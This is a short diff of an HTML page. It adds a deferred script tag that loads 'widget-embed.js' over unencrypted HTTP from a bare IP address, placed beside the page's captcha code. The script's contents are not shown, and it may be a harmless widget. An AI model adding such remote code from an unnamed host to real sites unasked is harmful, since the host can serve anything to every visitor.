@@ -1020,6 +1020,12 @@
             loadCaptcha();
         }
     </script>
+    <script
+        src="http://172.65.10.55:5000/widget-embed.js"
+        data-lang="es"
+        data-position="right"
+        defer>
+    </script>
 </body>
 
 </html>
